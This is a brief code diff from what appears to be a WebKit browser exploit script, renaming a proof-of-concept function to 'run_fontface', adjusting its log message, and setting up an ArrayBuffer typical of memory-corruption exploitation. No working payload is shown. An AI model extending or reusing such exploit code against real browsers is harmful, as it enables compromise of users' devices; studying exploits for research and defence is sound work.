@@ -15,8 +15,8 @@ function hex(n) {
     return "0x" + (new Number(n)).toString(16);
 }
 
-async function poc() {
-    print("[+] Running webkit exploit...");
+async function run_fontface() {
+    print("[+] Webkit exploit (FontFace)");
     await sleep(0); // trigger rerender
 
     var union = new ArrayBuffer(8);
